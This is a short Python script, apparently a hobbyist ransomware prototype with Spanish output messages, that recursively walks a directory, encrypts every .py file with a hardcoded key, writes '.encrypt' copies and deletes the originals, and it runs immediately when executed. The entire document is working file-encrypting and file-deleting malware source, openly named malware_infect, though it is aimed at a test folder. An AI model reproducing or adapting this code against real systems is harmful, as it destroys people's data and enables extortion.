import os
from simplecrypt import encrypt

path = '/root/Documents/Python/Ransonware/test'
clave = "test"
  
def cifrar(clave, file, fileout=None):
    if not fileout:
        fileout=file+'.encrypt'
    size = os.path.getsize(file)

    with open(file, 'rb') as ifile:   
        with open(fileout,'wb') as ofile:
            cifrando= encrypt(clave, ifile.read())
            ofile.write(cifrando)
            
            
def malware_infect():
    for root , dirName, fileList in os.walk(path):
        #  print('Found directory: %s' % dirName)
        for fname in fileList:
            print('Se va a cifrar: \t%s' % fname)
            if fname.endswith('.py'):
                cifrar(clave,os.path.join(root,fname))
                print('Archivo cifrado: \t%s' % fname)
                os.remove(os.path.join(root, fname)) 
                print('Archivo borrado: \t%s' % fname)
                
malware_infect()
                



            
